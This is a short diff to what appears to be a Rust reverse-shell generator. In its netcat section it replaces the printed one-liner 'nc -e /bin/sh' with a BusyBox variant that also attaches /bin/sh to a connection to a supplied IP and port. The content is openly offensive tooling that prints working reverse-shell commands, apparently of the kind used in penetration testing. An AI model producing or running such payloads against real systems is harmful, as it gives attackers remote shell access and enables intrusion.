@@ -107,8 +107,8 @@ fn generate_python(ip: &str, port: u16) {
 
 fn generate_netcat(ip: &str, port: u16) {
     print_section_separator();
-    print_header("Netcat (Traditional)");
-        println!("nc -e /bin/sh {} {}", ip, port);
+    print_header("Netcat (Busybox)");
+        println!("busybox nc {} {} -e /bin/sh", ip, port);
         println!();
     
     print_header("Netcat (OpenBSD/No -e flag)");
